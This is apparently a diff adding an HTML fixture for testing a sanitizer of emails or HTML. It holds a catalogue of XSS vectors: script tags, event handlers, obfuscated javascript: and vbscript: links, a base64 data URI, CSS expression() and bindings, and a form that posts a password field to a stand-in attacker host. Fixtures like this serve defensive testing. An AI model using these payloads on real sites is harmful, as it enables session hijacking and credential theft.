@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="refresh" content="0;url=https://pirate.invalide/">
+<meta charset="utf-8">
+<base href="https://pirate.invalide/">
+<link rel="stylesheet" href="https://pirate.invalide/style.css">
+<title>Titre secret</title>
+<style>
+@import url("https://pirate.invalide/a.css");
+.titre { color: #123456; width: expression(alert(1)); }
+.pied { -moz-binding: url("https://pirate.invalide/x.xml#x"); behavior: url(x.htc); margin: 0 }
+</style>
+<script>alert('tête')</script>
+</head>
+<body onload="alert(1)">
+<!-- commentaire à retirer -->
+<script>document.cookie = "SCRIPT_CORPS";</script>
+<p class="titre" onclick="alert(2)" onmouseover="alert(3)">Bonjour <b>Colin</b></p>
+<img src="data:image/png;base64,iVBORw0KGgo=" onerror="alert(4)" alt="pixel">
+<a href="javascript:alert(5)">piège 1</a>
+<a href="JaVaScRiPt:alert(6)">piège 2</a>
+<a href="java&#x09;script:alert(7)">piège 3</a>
+<a href="  javascript:alert(8)">piège 4</a>
+<a href="&#106;avascript:alert(9)">piège 5</a>
+<a href="vbscript:msgbox(1)">piège 6</a>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">piège 7</a>
+<a href="https://exemple.com/page?a=1&amp;b=2">lien sain</a>
+<a href="mailto:alice@exemple.fr">écrire</a>
+<a href="tel:+33600000000">appeler</a>
+<svg width="10" height="10"><script>alert('SVG_SCRIPT')</script><circle r="5"/></svg>
+<math><mtext>MATHS</mtext></math>
+<template><p>GABARIT</p></template>
+<form action="https://pirate.invalide/post" method="post">
+  <input type="text" name="mdp" value="CHAMP">
+  <input type="submit" formaction="https://pirate.invalide/autre" value="Envoyer">
+  <button formaction="https://pirate.invalide/b">BOUTON</button>
+  <select><option>OPTION</option></select>
+  <textarea>ZONE</textarea>
+</form>
+<iframe src="https://pirate.invalide/cadre">CADRE</iframe>
+<object data="https://pirate.invalide/o.swf">OBJET</object>
+<embed src="https://pirate.invalide/e.swf">
+<noscript>NOSCRIPT</noscript>
+<div style="background:url(javascript:alert(10)); color: red; width: expression(alert(11))">div stylé</div>
+<p class="pied">Pied de mail</p>
+</body>
+</html>
